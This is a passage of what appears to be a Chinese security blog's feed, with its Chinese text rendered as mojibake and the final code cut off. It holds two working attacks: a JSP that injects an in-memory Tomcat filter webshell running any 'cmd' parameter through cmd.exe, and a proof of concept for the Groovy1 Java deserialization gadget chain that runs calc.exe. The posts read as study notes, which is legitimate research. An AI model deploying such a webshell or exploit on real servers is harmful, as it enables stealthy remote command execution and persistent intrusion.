&#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">destroy</span><span class="hljs-params">()</span> &#123;<br>        Filter.<span class="hljs-built_in">super</span>.destroy();<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="web-xml"><a href="#web-xml" class="headerlink" title="web.xml"></a>web.xml</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">web-app</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://xmlns.jcp.org/xml/ns/javaee&quot;</span></span><br><span class="hljs-tag">         <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><br><span class="hljs-tag">         <span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">&quot;http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd&quot;</span></span><br><span class="hljs-tag">         <span class="hljs-attr">version</span>=<span class="hljs-string">&quot;4.0&quot;</span>&gt;</span><br>    <br><span class="hljs-tag">&lt;<span class="hljs-name">filter</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">display-name</span>&gt;</span>FilterDemo<span class="hljs-tag">&lt;/<span class="hljs-name">display-name</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">filter-name</span>&gt;</span>FilterDemo<span class="hljs-tag">&lt;/<span class="hljs-name">filter-name</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">filter-class</span>&gt;</span>Test.FilterDemo<span class="hljs-tag">&lt;/<span class="hljs-name">filter-class</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">filter</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">filter-mapping</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">filter-name</span>&gt;</span>FilterDemo<span class="hljs-tag">&lt;/<span class="hljs-name">filter-name</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">url-pattern</span>&gt;</span>/demo<span class="hljs-tag">&lt;/<span class="hljs-name">url-pattern</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">filter-mapping</span>&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">web-app</span>&gt;</span><br></code></pre></td></tr></table></figure><p>ç„¶ååœ¨è®¿é—®&#x2F;demoçš„æ—¶å€™å‡ºç°ã€‚<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202204111607015.png" alt="QQæˆªå›¾20220411160730"></p><p>ç„¶åå°±æ˜¯è°ƒè¯•ã€‚</p><h2 id="è°ƒè¯•"><a href="#è°ƒè¯•" class="headerlink" title="è°ƒè¯•"></a>è°ƒè¯•</h2><p>è¿™é‡Œè·Ÿç€è¿™ä½<a href="https://xz.aliyun.com/t/10362#toc-2">å¸ˆå‚…</a>å­¦ä¹ çš„ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202204111701165.png" alt="QQæˆªå›¾20220411160807"></p><p>ä¸‹å…¥æ–­ç‚¹ã€‚</p><h3 id="è°ƒç”¨é“¾"><a href="#è°ƒç”¨é“¾" class="headerlink" title="è°ƒç”¨é“¾"></a>è°ƒç”¨é“¾</h3><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202204111608674.png" alt="QQæˆªå›¾20220411160841"></p><p>è¿™é‡Œå°±ä¸åšæ— èŠçš„å·¥ä½œäº†ã€‚</p><h2 id="å†…å­˜é©¬"><a href="#å†…å­˜é©¬" class="headerlink" title="å†…å­˜é©¬"></a>å†…å­˜é©¬</h2><p><strong>FilterMaps</strong>ï¼šå­˜æ”¾FilterMapçš„æ•°ç»„ï¼Œåœ¨ <strong>FilterMap</strong> ä¸­ä¸»è¦å­˜æ”¾äº† FilterName å’Œ å¯¹åº”çš„URLPatternã€‚</p><p><strong>FilterDefs</strong>ï¼šå­˜æ”¾FilterDefçš„æ•°ç»„ ï¼Œ<strong>FilterDef</strong> ä¸­å­˜å‚¨ç€æˆ‘ä»¬è¿‡æ»¤å™¨åï¼Œè¿‡æ»¤å™¨å®ä¾‹ï¼Œä½œç”¨ url ç­‰åŸºæœ¬ä¿¡æ¯ã€‚</p><p><strong>FilterConfigs</strong>ï¼šå­˜æ”¾filterConfigçš„æ•°ç»„ï¼Œåœ¨ <strong>FilterConfig</strong> ä¸­ä¸»è¦å­˜æ”¾ FilterDef å’Œ Filterå¯¹è±¡ç­‰ä¿¡æ¯</p><p>ä¹Ÿå°±è¯´è¿™é‡Œå¯ä»¥è¿›è¡Œæ§åˆ¶è¿™äº›æ¥è¾¾æˆå†…å­˜é©¬æ³¨å…¥ã€‚ï¼ˆè¿™é‡Œå½“ç„¶è¦è‡ªå·±å¯¼å…¥åŒ…ï¼Œå› ä¸ºè‡ªå·±åœ¨windowsä¸Šå¾—å¤ç°ï¼Œè¿™é‡Œä¿®æ”¹äº†ä¸€äº›ä½œè€…å¾—åŸä»£ç ã€‚ï¼‰</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.core.ApplicationContext&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.lang.reflect.Field&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.util.Map&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.io.IOException&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.tomcat.util.descriptor.web.FilterDef&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.tomcat.util.descriptor.web.FilterMap&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.lang.reflect.Constructor&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.core.ApplicationFilterConfig&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.Context&quot;</span> %&gt;<br>&lt;%@ page language=<span class="hljs-string">&quot;java&quot;</span> contentType=<span class="hljs-string">&quot;text/html; charset=UTF-8&quot;</span> pageEncoding=<span class="hljs-string">&quot;UTF-8&quot;</span>%&gt;<br><br>&lt;%<br>    <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;xs&quot;</span>;<br>    <span class="hljs-type">ServletContext</span> <span class="hljs-variable">servletContext</span> <span class="hljs-operator">=</span> request.getSession().getServletContext();<br><br>    <span class="hljs-type">Field</span> <span class="hljs-variable">appctx</span> <span class="hljs-operator">=</span> servletContext.getClass().getDeclaredField(<span class="hljs-string">&quot;context&quot;</span>);<br>    appctx.setAccessible(<span class="hljs-literal">true</span>);<br>    <span class="hljs-type">ApplicationContext</span> <span class="hljs-variable">applicationContext</span> <span class="hljs-operator">=</span> (ApplicationContext) appctx.get(servletContext);<br><br>    <span class="hljs-type">Field</span> <span class="hljs-variable">stdctx</span> <span class="hljs-operator">=</span> applicationContext.getClass().getDeclaredField(<span class="hljs-string">&quot;context&quot;</span>);<br>    stdctx.setAccessible(<span class="hljs-literal">true</span>);<br>    <span class="hljs-type">StandardContext</span> <span class="hljs-variable">standardContext</span> <span class="hljs-operator">=</span> (StandardContext) stdctx.get(applicationContext);<br><br>    <span class="hljs-type">Field</span> <span class="hljs-variable">Configs</span> <span class="hljs-operator">=</span> standardContext.getClass().getDeclaredField(<span class="hljs-string">&quot;filterConfigs&quot;</span>);<br>    Configs.setAccessible(<span class="hljs-literal">true</span>);<br>    <span class="hljs-type">Map</span> <span class="hljs-variable">filterConfigs</span> <span class="hljs-operator">=</span> (Map) Configs.get(standardContext);<br><br>    <span class="hljs-keyword">if</span> (filterConfigs.get(name) == <span class="hljs-literal">null</span>)&#123;<br>        <span class="hljs-type">Filter</span> <span class="hljs-variable">filter</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Filter</span>() &#123;<br>            <span class="hljs-meta">@Override</span><br>            <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">(FilterConfig filterConfig)</span> <span class="hljs-keyword">throws</span> ServletException &#123;<br><br>            &#125;<br><br>            <span class="hljs-meta">@Override</span><br>            <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doFilter</span><span class="hljs-params">(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain)</span> <span class="hljs-keyword">throws</span> IOException, ServletException &#123;<br>                <span class="hljs-type">HttpServletRequest</span> <span class="hljs-variable">req</span> <span class="hljs-operator">=</span> (HttpServletRequest) servletRequest;<br>                <span class="hljs-keyword">if</span> (req.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>) != <span class="hljs-literal">null</span>)&#123;<br>                    <span class="hljs-type">byte</span>[] bytes = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">1024</span>];<br><span class="hljs-comment">//                    Process process = new ProcessBuilder(&quot;bash&quot;,&quot;-c&quot;,req.getParameter(&quot;cmd&quot;)).start();</span><br>                    <span class="hljs-type">Process</span> <span class="hljs-variable">process</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ProcessBuilder</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;cmd.exe&quot;</span>, <span class="hljs-string">&quot;/c&quot;</span>,req.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>)&#125;).start();<br>                    <span class="hljs-type">int</span> <span class="hljs-variable">len</span> <span class="hljs-operator">=</span> process.getInputStream().read(bytes);<br>                    servletResponse.getWriter().write(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(bytes,<span class="hljs-number">0</span>,len));<br>                    process.destroy();<br>                    <span class="hljs-keyword">return</span>;<br>                &#125;<br>                filterChain.doFilter(servletRequest,servletResponse);<br>            &#125;<br><br>            <span class="hljs-meta">@Override</span><br>            <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">destroy</span><span class="hljs-params">()</span> &#123;<br><br>            &#125;<br><br>        &#125;;<br><br><br>        <span class="hljs-type">FilterDef</span> <span class="hljs-variable">filterDef</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FilterDef</span>();<br>        filterDef.setFilter(filter);<br>        filterDef.setFilterName(name);<br>        filterDef.setFilterClass(filter.getClass().getName());<br>        <span class="hljs-comment">/**</span><br><span class="hljs-comment">         * å°†filterDefæ·»åŠ åˆ°filterDefsä¸­</span><br><span class="hljs-comment">         */</span><br>        standardContext.addFilterDef(filterDef);<br><br>        <span class="hljs-type">FilterMap</span> <span class="hljs-variable">filterMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FilterMap</span>();<br>        filterMap.addURLPattern(<span class="hljs-string">&quot;/*&quot;</span>);<br>        filterMap.setFilterName(name);<br>        filterMap.setDispatcher(DispatcherType.REQUEST.name());<br><br>        standardContext.addFilterMapBefore(filterMap);<br><br>        <span class="hljs-type">Constructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> ApplicationFilterConfig.class.getDeclaredConstructor(Context.class,FilterDef.class);<br>        constructor.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">ApplicationFilterConfig</span> <span class="hljs-variable">filterConfig</span> <span class="hljs-operator">=</span> (ApplicationFilterConfig) constructor.newInstance(standardContext,filterDef);<br><br>        filterConfigs.put(name,filterConfig);<br>        out.print(<span class="hljs-string">&quot;Inject Success !&quot;</span>);<br>    &#125;<br>%&gt;<br></code></pre></td></tr></table></figure><h2 id="æ•ˆæœ"><a href="#æ•ˆæœ" class="headerlink" title="æ•ˆæœ"></a>æ•ˆæœ</h2><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202204111658193.png" alt="QQæˆªå›¾20220411165825"></p>]]></content>
    
    
    <categories>
      
      <category>å†…å­˜é©¬</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Groovy1</title>
    <link href="/2022/04/10/Groovy1/"/>
    <url>/2022/04/10/Groovy1/</url>
    
    <content type="html"><![CDATA[<h1 id="Groovy1"><a href="#Groovy1" class="headerlink" title="Groovy1"></a>Groovy1</h1><h2 id="ç¯å¢ƒ"><a href="#ç¯å¢ƒ" class="headerlink" title="ç¯å¢ƒ"></a>ç¯å¢ƒ</h2><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-section">&lt;dependencies&gt;</span><br><span class="hljs-section">&lt;dependency&gt;</span><br><span class="hljs-section">&lt;groupId&gt;</span><span class="hljs-attribute">org</span>.codehaus.groovy&lt;/groupId&gt;<br><span class="hljs-section">&lt;artifactId&gt;</span><span class="hljs-attribute">groovy</span>&lt;/artifactId&gt;<br><span class="hljs-section">&lt;version&gt;</span><span class="hljs-attribute">2</span>.<span class="hljs-number">3</span>.<span class="hljs-number">9</span>&lt;/version&gt;  //è¿™é‡Œç‰ˆæœ¬<span class="hljs-number">1</span>.<span class="hljs-number">7</span>.<span class="hljs-number">0</span>-<span class="hljs-number">2</span>.<span class="hljs-number">4</span>.<span class="hljs-number">3</span>å‡å¯<br><span class="hljs-section">&lt;/dependency&gt;</span><br><span class="hljs-section">&lt;/dependencies&gt;</span><br></code></pre></td></tr></table></figure><h2 id="åˆ©ç”¨é“¾"><a href="#åˆ©ç”¨é“¾" class="headerlink" title="åˆ©ç”¨é“¾"></a>åˆ©ç”¨é“¾</h2><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">AnnotationInvocationHandler</span>.</span></span>read<span class="hljs-constructor">Object()</span><br>    <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Map</span>.</span></span>entry<span class="hljs-constructor">Set()</span> (Proxy)<br>        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ConversionHandler</span>.</span></span>invoke<span class="hljs-literal">()</span><br>            <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ConvertedClosure</span>.</span></span>invoke<span class="hljs-constructor">Custom()</span><br>        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">MethodClosure</span>.</span></span>call<span class="hljs-literal">()</span><br>                    <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ProcessGroovyMethods</span>.</span></span>execute<span class="hljs-literal">()</span><br></code></pre></td></tr></table></figure><h2 id="MethodClosure-call"><a href="#MethodClosure-call" class="headerlink" title="MethodClosure.call()"></a>MethodClosure.call()</h2><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202204101311567.png" alt="QQæˆªå›¾20220410131046"></p><p>è¿™é‡Œå¯ä»¥çœ‹åˆ°æ¥æ”¶äº†ä¸€ä¸ªå¯¹è±¡å’Œä¸€ä¸ªæ–¹æ³•ã€‚å¹¶ä¸”æœ‰doCallæ–¹æ³•è¿›è¡Œåå°„ã€‚<br>é‚£ä¹ˆæˆ‘ä»¬å¯ä»¥è¿™æ ·åšï¼</p><h2 id="Demo"><a href="#Demo" class="headerlink" title="Demo"></a>Demo</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> org.codehaus.groovy.runtime.MethodClosure;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Groovy1Demo</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> NoSuchMethodException, InvocationTargetException, IllegalAccessException &#123;<br>        <span class="hljs-type">MethodClosure</span> <span class="hljs-variable">exec</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MethodClosure</span>(Runtime.getRuntime(), <span class="hljs-string">&quot;exec&quot;</span>);<br>        <span class="hljs-type">Method</span> <span class="hljs-variable">doCall</span> <span class="hljs-operator">=</span> MethodClosure.class.getDeclaredMethod(<span class="hljs-string">&quot;doCall&quot;</span>, Object.class);<br>        doCall.setAccessible(<span class="hljs-literal">true</span>);<br>        doCall.invoke(exec,<span class="hljs-string">&quot;calc.exe&quot;</span>);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202204101512217.png" alt="QQæˆªå›¾20220410132039"></p><p>ä½†æ˜¯è¿™é‡ŒRuntime.getRuntimeå¹¶ä¸å¯ä»¥ååºåˆ—åŒ–ã€‚</p><h2 id="ProcessGroovyMethods-execute"><a href="#ProcessGroovyMethods-execute" class="headerlink" title="ProcessGroovyMethods.execute()"></a>ProcessGroovyMethods.execute()</h2><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202204101512562.png" alt="QQæˆªå›¾20220410132259"></p><h3 id="Demo-1"><a href="#Demo-1" class="headerlink" title="Demo"></a>Demo</h3><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gradle">MethodClosure methodClosure = <span class="hljs-keyword">new</span> MethodClosure(<span class="hljs-string">&quot;calc.exe&quot;</span>, <span class="hljs-string">&quot;execute&quot;</span>);<br>        methodClosure.<span class="hljs-keyword">call</span>();<br></code></pre></td></tr></table></figure><p>è¿™é‡Œè°ƒè¯•çœ‹ä¸€ä¸‹ï¼Œcallæ–¹æ³•ï¼Œä¸€è·¯èµ°ä¸‹æ¥ã€‚ä¼šæ¥åˆ°è¿™é‡Œã€‚<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202204101512182.png" alt="QQæˆªå›¾20220410140457"></p><p>ç»§ç»­è·Ÿè¿›ã€‚<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202204101512760.png" alt="QQæˆªå›¾20220410140520"></p><p>æœ€ååˆ™ä¼šæ¥åˆ°ProcessGroovyMethods.execute()å¹¶ä¸”ä¼ å…¥å‚æ•°ã€‚<br>å¹¶ä¸”è¿™é‡Œç»§æ‰¿äº†Serializableï¼Œå¯ä»¥ååºåˆ—åŒ–ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202204101416020.png" alt="QQæˆªå›¾20220410141638"></p><h2 id="AnnotationInvocationHandler-readObject"><a href="#AnnotationInvocationHandler-readObject" class="headerlink" title="AnnotationInvocationHandler.readObject()"></a>AnnotationInvocationHandler.readObject()</h2><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202204101512342.png" alt="QQæˆªå›¾20220410144159"></p><p><strong>è¿™é‡Œå¯ä»¥æ¸…æ¥šçš„çœ‹åˆ°var4.entrySet()ï¼Œå¦‚æœvar4ä¸ºåŠ¨æ€ä»£ç†åˆ›å»ºçš„mapå¯¹è±¡ï¼Œé‚£ä¹ˆå¦‚æœè°ƒç”¨äº†æ¥å£çš„ä»»æ„æ–¹æ³•ï¼Œå°±ä¼šå®ç°æ¥å£æ–¹æ³•å¤„ç†ç±»çš„invokeæ–¹æ³•ã€‚</strong></p><h2 id="ConversionHandler-invoke"><a href="#ConversionHandler-invoke" class="headerlink" title="ConversionHandler.invoke()"></a>ConversionHandler.invoke()</h2><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202204101512919.png" alt="QQæˆªå›¾20220410144454"></p><p>è¿›å»ç§ç§ã€‚<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202204101512446.png" alt="QQæˆªå›¾20220410144502"></p><p>å¯ä»¥æ¸…æ¥šçš„çœ‹åˆ°æ¥å£äº†InvocationHandlerã€‚ä¹Ÿå°±æ˜¯è¯´å¯ä»¥å®ç°è¿™é‡Œçš„invokeã€‚<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202204101446179.png" alt="QQæˆªå›¾20220410144635"></p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202204101512842.png" alt="QQæˆªå›¾20220410144713"><br>è¿™é‡Œåˆå¯ä»¥çœ‹åˆ°å›åˆ°äº†InvokeCustomï¼Œå¹¶ä¸”è¿™é‡Œçš„åˆ¤æ–­æ˜¯å¦æ»¡è¶³Objectæ–¹æ³•ã€‚å¦‚æœæ»¡è¶³å°±ä¼šè¿›å…¥è¿™é‡Œã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202204101512448.png" alt="QQæˆªå›¾20220410150444"></p><p>è¿™é‡Œè¿›è¡Œäº†ä¸€äº›åˆ¤æ–­ã€‚è€Œè¿™é‡Œåªéœ€è¦ä¸€äº›æ„é€ å°±å¯ä»¥æ»¡è¶³ã€‚</p><p>ç„¶åä¸‹é¢çš„getDelegateå°±æ˜¯ä¼šè°ƒç”¨çˆ¶ç±»çš„å‡½æ•°ã€‚å°±ä¸è·Ÿäº†ã€‚</p><h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> org.codehaus.groovy.runtime.ConvertedClosure;<br><span class="hljs-keyword">import</span> org.codehaus.groovy.runtime.MethodClosure;<br><br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.annotation.Target;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationHandler;<br><span class="hljs-keyword">import</span> java.lang.reflect.Proxy;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Groovy1Test</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br>        <span class="hljs-comment">//å°è£…æˆ‘ä»¬éœ€è¦æ‰§è¡Œçš„å¯¹è±¡</span><br>        <span class="hljs-type">MethodClosure</span> <span class="hljs-variable">methodClosure</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MethodClosure</span>(<span class="hljs-string">&quot;calc.exe&quot;</span>, <span class="hljs-string">&quot;execute&quot;</span>);<br>        <span class="hljs-type">ConvertedClosure</span> <span class="hljs-variable">closure</span>       <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConvertedClosure</span>(methodClosure, <span class="hljs-string">&quot;entrySet&quot;</span>);<br><br>        Class&lt;?&gt;       c           = Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        Constructor&lt;?&gt; constructor = c.getDeclaredConstructors()[<span class="hljs-number">0</span>];<br>        constructor.setAccessible(<span class="hljs-literal">true</span>);<br><br>        <span class="hljs-comment">// åˆ›å»º ConvertedClosure çš„åŠ¨æ€ä»£ç†ç±»å®ä¾‹</span><br>        <span class="hljs-type">Map</span> <span class="hljs-variable">handler</span> <span class="hljs-operator">=</span> (Map) Proxy.newProxyInstance(ConvertedClosure.class.getClassLoader(),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Map.class&#125;, closure);<br><br>        <span class="hljs-comment">// ä½¿ç”¨åŠ¨æ€ä»£ç†åˆå§‹åŒ– AnnotationInvocationHandler</span><br>        <span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">invocationHandler</span> <span class="hljs-operator">=</span> (InvocationHandler) constructor.newInstance(Target.class, handler);<br>        serialize(invocationHandler);<br>        unserialize(<span class="hljs-string">&quot;xsw6a.bin&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object o)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">objectOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;xsw6a.bin&quot;</span>));<br>        objectOutputStream.writeObject(o);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String FileName)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">objectInputStream</span> <span 